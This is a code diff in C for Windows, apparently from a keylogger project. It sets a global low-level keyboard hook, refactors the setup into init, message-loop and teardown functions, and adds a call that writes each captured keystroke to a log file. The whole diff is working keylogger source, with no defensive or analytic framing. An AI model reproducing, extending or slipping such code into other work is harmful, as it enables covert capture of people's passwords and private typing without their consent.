@@ -32,23 +32,42 @@ LRESULT CALLBACK kb_proc(int code, WPARAM w, LPARAM l)
 	{
 		hookConvertCode(log.sCode,p->vkCode);
 		logGetInfo(&log);
+		logWriteFile(log);
 		logPrintInfo(log);
 	}
 	return CallNextHookEx(g_hook, code, w, l);
 }
 
+int hookInit(){
+	g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, &kb_proc, GetModuleHandle(NULL),0);	//设置全局低级键盘钩子
+	if (g_hook==NULL)return -1;
+	return 0;
+}
+
+int hookDestroy(){
+	int ret = 0;
+	if (g_hook){
+		ret = UnhookWindowsHookEx(g_hook);
+	}
+	return ret;
+}
+
+void hookMessage(){
+	MSG msg;
+	while(GetMessage(&msg,NULL,0,0)){
+		//PeekMessage(&msg,0,0,0,PM_REMOVE)
+		TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+}
 
 void hookVirtualKey()
 {
-    MSG msg;
+	hookInit();
+	hookMessage();
+	hookDestroy();
 //	g_tid = GetCurrentThreadId();
 //	SetConsoleCtrlHandler(&con_handler, TRUE);
-    g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, &kb_proc, GetModuleHandle(NULL),0);	//设置全局低级键盘钩子
-	while (GetMessage(&msg, NULL, 0, 0)){
-        TranslateMessage(&msg);
-        DispatchMessage(&msg);
-    }
-    UnhookWindowsHookEx(g_hook);
 }
 
 
